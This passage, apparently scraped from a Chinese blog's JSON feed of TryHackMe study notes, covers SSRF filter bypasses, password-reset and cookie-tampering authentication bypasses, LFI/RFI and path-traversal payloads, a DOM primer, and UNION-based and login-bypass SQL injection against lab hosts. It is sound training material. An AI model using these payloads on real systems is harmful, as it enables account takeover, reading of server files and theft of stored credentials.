127.0.0.1.nip.io。\n此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。\n允许列表 在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 https://website.thm 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。\n打开重定向 如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png","permalink":"https://Yerucrem.github.io/p/ssrf%E5%9F%BA%E7%A1%80/","title":"SSRF基础"},{"content":"身份验证绕过 用户名枚举 暴力 逻辑缺陷 什么是逻辑缺陷？ 有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。\n逻辑缺陷示例 下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。\n1 2 3 4 5 if( url.substr(0,6) === \u0026#39;/admin\u0026#39;) { # Code to check user is an admin } else { # View Page } 因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 /adMin 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。\n逻辑缺陷实用 我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息Account not found from provided email address\n出于演示目的，我们将使用 email address robert@acmeitsupport.thm被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 robert@acmeitsupport.thm发送一封密码重置电子邮件。\n在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。\n在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。\n让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026#39; 我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。\n在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 $_REQUEST 中的数据发送密码重置电子邮件。\nPHP$_REQUEST 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。\n1 user@tryhackme$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email=attacker@hacker.com\u0026#39; **下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 {username}@customer.acmeitsupport.thm\n现在重新运行 Curl 请求 2，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。\n1 user@tryhackme:~$ curl \u0026#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm\u0026#39; -H \u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -d \u0026#39;username=robert\u0026amp;email={username}@customer.acmeitsupport.thm\u0026#39; Cookie 篡改 在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。\n纯文本 某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：\n1 2 Set-Cookie: logged_in=true; Max-Age=3600; Path=/ Set-Cookie: admin=false; Max-Age=3600; Path=/ 我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。\n首先，我们先请求目标页面：\n1 user@tryhackme$ curl http://MACHINE_IP/cookie-test 我们可以看到我们返回了一条消息：Not Logged In\n现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=false\u0026#34; http://MACHINE_IP/cookie-test 我们收到消息：Logged In As A User\n最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：\n1 user@tryhackme$ curl -H \u0026#34;Cookie: logged_in=true; admin=true\u0026#34; http://MACHINE_IP/cookie-test 这将返回结果：Logged In As An Admin\nHashing 散列法 有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：\n原始字符串 ** 哈希方法** 输出 1 md5 c4ca4238a0b923820dcc509a6f75849b 1 sha-256 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b 1 sha-512 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a 1 sha1 356a192b7913b04c54574d18c28d46e6395428ab 从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 https://crackstation.net/ 等服务会保留数十亿个哈希及其原始字符串的数据库。\n编码 编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。\n常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。\n以以下数据为例，该数据由 Web 服务器在登录时设置：\n1 Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/ 这个字符串 base64 解码的值为 {“id”：1，“admin”： false} ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png","permalink":"https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/","title":"身份验证绕过"},{"content":"文件包含基础 介绍 此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。\n在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。\n例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 https://www.google.com/search?q=TryHackMe。\n让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。\n为什么会出现文件包含漏洞？ 文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。\n文件包含有什么风险？ 默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。\n路径遍历 也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。\n当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。\n下图显示了 Web 应用程序如何在 /var/www/app 中存储文件。满意的路径是用户请求 从定义的路径 /var/www/app/CVs userCV.pdf。\n我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 http://webapp.thm/get.php?file=../../../../etc/passwd\n假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 .. 条目都会移动一个目录，直到到达根目录 /。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。\n因此，Web 应用程序将文件的内容发送回给用户。\n同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：\n1 2 3 http://webapp.thm/get.php?file=../../../../boot.ini 或 http://webapp.thm/get.php?file=../../../../windows/win.ini 与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .\n有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。\n位置 描述 /etc/issue 包含要在登录提示之前打印的消息或系统标识。 /etc/profile 控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达 /proc/version 指定 Linux 内核的版本 etc/passwd 等/passwd 具有有权访问系统的所有注册用户 /etc/shadow 包含有关系统用户密码的信息 /root/.bash_history 包含 root 用户的 history 命令 /var/log/dmessage 包含全局系统消息，包括系统启动期间记录的消息 `/var/mail/root 根用户的所有电子邮件 /root/.ssh/id_rsa 服务器上 root 或任何已知有效用户的私有 SSH 密钥 /var/log/apache2/access.log Web 服务器的访问请求 C:\\boot.ini C：\\boot.ini 包含具有 BIOS 固件的计算机的启动选项 本地文件包含 LFI 一 针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。\n1 2 3 \u0026lt;?PHP include($_GET[\u0026#34;lang\u0026#34;]); ?\u0026gt; 上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 http://webapp.thm/index.php?lang=AR.php加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。\n理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd\n在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。\n二 接下来，在下面的代码中，开发人员决定指定函数内部的目录。\n1 2 3 \u0026lt;?PHP include(\u0026#34;languages/\u0026#34;. $_GET[\u0026#39;lang\u0026#39;]); ?\u0026gt; 在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。\n如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。\n同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 本地文件包含 LFI2 在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。\n在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。\n在此方案中，我们有以下入口点： http://webapp.thm/index.php?lang=EN 。如果我们输入无效的输入（例如 THM），则会收到以下错误\n1 Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：include（languages/THM.php）;。\n如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：index.php？lang=EN，其中文件 EN 位于给定的语言目录中，名为 EN。php 的\n此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 /var/www/html/THM-4/\n要利用这一点，我们需要使用 ../ 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：\n1 http://webapp.thm/index.php?lang=../../../../etc/passwd 请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 /var/www/html/THM-4。但我们仍然收到以下错误：\n1 Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12 似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 %00。\n使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。\n通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：\n1 include(\u0026#34;languages/../../../../../etc/passwd%00\u0026#34;).\u0026#34;.php\u0026#34;); `等同于 `include(\u0026#34;languages/../../../../../etc/passwd\u0026#34;); 注意： %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。\n四 现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。\nhttp://webapp.thm/index.php?lang=../../../../etc/passwd\n我们收到了以下错误！\n1 Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15 如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。\n首先，我们可以发送以下 payload 来绕过它： ....//....//....//....//....//etc/passwd\n这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 ../ 它找到并且不执行另一次传递，留下下图所示的内容。\n五 最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： http://webapp.thm/index的php?lang=languages/EN.php然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： ?lang=languages/../../../../../etc/passwd 。\n远程文件包含 RFI 远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。\nRFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：\n敏感信息泄露 跨站点脚本 （XSS） 拒绝服务 （DoS） 外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。\nRFI步骤 下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.\n1 \u0026lt;?PHP echo \u0026#34;Hello THM\u0026#34;; ?\u0026gt; 首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。\n","date":"2025-03-19T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png","permalink":"https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/","title":"文件包含基础"},{"content":"DOM Document Object Model 文档对象模型\n什么是文档对象模型？ \u0026mdash; What is the Document Object Model?\nDOM 是什么？ 想象一下，你有一张房子的建筑蓝图，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 \u0026lt;html\u0026gt;、\u0026lt;div\u0026gt;、\u0026lt;p\u0026gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。\n简单来说，DOM 是网页的骨架图，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。\n1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;我的网页\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;欢迎\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;这是一个段落。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 在这个 HTML 里，DOM 会把它变成一个树形结构：\n1 2 3 4 5 6 7 8 9 - \u0026lt;html\u0026gt; 是根节点，就像树的树根，整个网页的起点。 - \u0026lt;html\u0026gt; 下面有两个“孩子”：\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt;。 - \u0026lt;head\u0026gt; 里有个孩子 \u0026lt;title\u0026gt;，它的内容是“我的网页”。 - \u0026lt;body\u0026gt; 里有两个孩子：\u0026lt;h1\u0026gt;（内容是“欢迎”）和 \u0026lt;p\u0026gt;（内容是“这是一个段落。”）。 这就像一个家庭的家谱：\u0026lt;html\u0026gt; 是爷爷，\u0026lt;head\u0026gt; 和 \u0026lt;body\u0026gt; 是他的两个孩子，\u0026lt;title\u0026gt; 是 \u0026lt;head\u0026gt; 的孩子，\u0026lt;h1\u0026gt; 和 \u0026lt;p\u0026gt; 是 \u0026lt;body\u0026gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 \u0026lt;p\u0026gt; 的 innerHTML 属性就是“这是一个段落。”。 DOM 有什么用？ DOM 的牛逼之处在于，它让 JavaScript 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：\n查看：找到某个节点，看看它是什么内容。 修改：比如把 \u0026lt;p\u0026gt; 的文字从“这是一个段落。”改成“这是新段落！”。 添加：在 \u0026lt;body\u0026gt; 里加一个新的 \u0026lt;p\u0026gt; 节点。 删除：把某个节点去掉。 举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：\n1 找到 \u0026lt;p\u0026gt; 节点 let paragraph = document.querySelector(\u0026#34;p\u0026#34;); // 修改它的内容 paragraph.innerHTML = \u0026#34;文字被我改啦！\u0026#34;; 再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 \u0026lt;li\u0026gt;），然后把它加到列表里。\nDOM 是桥梁 所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。\n小结 用最简单的话说：\nDOM 是网页的树形蓝图，把每个元素都变成节点。 JavaScript 通过 DOM 操作网页，可以改内容、加东西、删东西。 它让网页变得活起来，能根据用户的操作动态变化。 ","date":"2025-03-18T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png","permalink":"https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/","title":"DOM 文档对象模型"},{"content":"SQL注入 SQL 语法不区分大小写。\nSQL基础 SELECT 我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。\nselect * from users;\n第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。\n下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。\nselect username,password from users;\n与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。\nselect * from users LIMIT 1;\nselect * from users where username='admin';\n这只会返回 username 等于 admin 的行。\nselect * from users where username != 'admin';\n这只会返回 username 不 等于 admin 的行。\nselect * from users where username='admin' or username='jon';\n这只会返回用户名等于 admin 或 jon 的行。\nselect * from users where username='admin' and password='p4ssword';\n这只会返回用户名等于 admin 且密码等于 p4ssword 的行.\nlike 使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。\nselect * from users where username like '%n';\n这将返回用户名以字母 n 结尾的任何行。\nselect * from users where username like '%mi%';\n这将返回用户名中包含字符 mi 的任何行。\nUNION UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：\n另一个表叫 suppliers，内容如下：\n使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：\nSELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;\nINSERT INSERT 语句告诉数据库我们希望在表中插入一行新数据。 “into users” 告诉数据库我们希望将数据插入到哪个表中， “（username，password）” 提供我们提供数据的列，然后 “values （\u0026lsquo;bob\u0026rsquo;，\u0026lsquo;password\u0026rsquo;）”; 提供以前指定的列的数据。\ninsert into users (username,password) values ('bob','password123');\nUPDATE UPDATE 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “update %tablename% SET” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “username=\u0026lsquo;root\u0026rsquo;，password=\u0026lsquo;pass123\u0026rsquo;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “where username=\u0026lsquo;admin;“\nupdate users SET username='root',password='pass123' where username='admin';\nDELETE DELETE 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 where 子句精确指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。\ndelete from users where username='martin';\ndelete from users;\n由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。\n基础做题 In-Band SQL Injection 查询库 利用union查询的原理，先确定回显的位置。\n构建 0 UNION SELECT 1,2,3\n可以看到页面情况，有三个回显位置\n构建 0 UNION SELECT 1,2,database()\n可以知道database的名字：sqli_one\n查询表 构建 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'\n在此查询中，需要学习一些新内容。首先，方法 group_concat（） 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 information_schema 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。\n由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\n这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 column_name，我们在 information_schema 数据库中查询的表已从 tables 更改为 columns，并且我们正在搜索 table_name 列值为 staff_users 的任何行\n查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。\n0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '\u0026lt;br\u0026gt;') FROM staff_users\n同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 ，\u0026rsquo;：\u0026rsquo;， 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 HTML \u0026lt;br\u0026gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。\n身份认证绕过盲注 与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。\n最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。\n连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。\n考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。\n实际： SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：\nselect * from users where username='%username%' and password='%password%' LIMIT 1;\n注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。\n要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：\n' OR 1=1;--\n这会将 SQL 查询转换为以下内容：\nselect * from users where username='' and password='' OR 1=1;\n因为 1=1 是 true 语句，并且我们使用了 OR 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。\n基于布尔盲注 基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。\n实际： 览器正文包含 {“taken”：true}。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 taken 的值设置为 true，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false\nselect * from users where username = '%username%' LIMIT 1;\n我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 admin123，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 